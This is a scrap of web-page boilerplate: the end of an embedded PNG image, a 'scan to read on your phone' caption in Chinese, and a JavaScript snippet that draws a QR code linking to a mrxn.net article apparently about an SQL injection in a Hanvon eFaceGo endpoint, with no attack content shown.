nwI2kdf3lG/8DCQHr74z57AdiA1rXG5Lcj0IThm6tpcXdfqvLRa6pA+8o4QH4LdX/HqX6t7sO4B0WHG6rFaMOcgvN/PWogPQXMQDg/cDsSiC3/2BA4Dgce0gPtunHZHA8DvX/3v3PxO14e53rxoTg7P8+YKYc7aS6xMrc5LGxd8rQ+s82PPuva+hYeBVOBa7zuBwzt1t1LTqiUXYZ46hFe2ljkR4st3WLW1ul9ara6vOOReEDRT9eNSh+T0IPzhh0PQ3M7vulyEdR/9wusVUqfwQev+Tt3pi7s9fteHPB27vhDf/hAOM1pvboU9A+mhLloL8eX6HSE59Z6XdzzL6xder5A6hQ9a979DINOH19DPwadBDqlXF/XPEOZ687s+kDxg9I7A9J2fBkSHYNf7veQdresIc199mHUIhwderxBP60PwPpA+/R3f7RsyZX2Yuf30RZhz6uKurvuVUxNLG1fX5aJZyJ7k+hAdZtQXe91ONzfifSAWXfjeEzgMBObpQ/hum/DffJ+Os/4w3wfC4Yi9FySjDjN3DzDru7x6R0g9zHiWG/3DQEbzuv75E/hjA/Ep81OQi5CnRh/CIahufsfVRfMj6ol6MN9Lv2PPy83JO+58dbHXQfYFXP/G8PZhH3/sFQKZstP384To8u6r7xBSb13HVZ0ZPUgP+RnCOm9fiA/B3g+iQ7DXmYf48sI/NpBqdq3/fgKHgTjNjrtbvZrb1avbB/LUQFAfwiG40yE+YGT7X2P1e8o72giY3vmb0/8qruoPA/lq0yv/Z0/gPhDI9OE5nt0e5vr+FEB8dRGi9/76XYfk9VfYazqHuQeEwxp39V13L12Xw9xfvfA+kCLXev8JXAN5/wymHfwfAAD//6OS25IAAAAGSURBVAMAb7f+yAq24h8AAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-queryAntisubmarineList-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 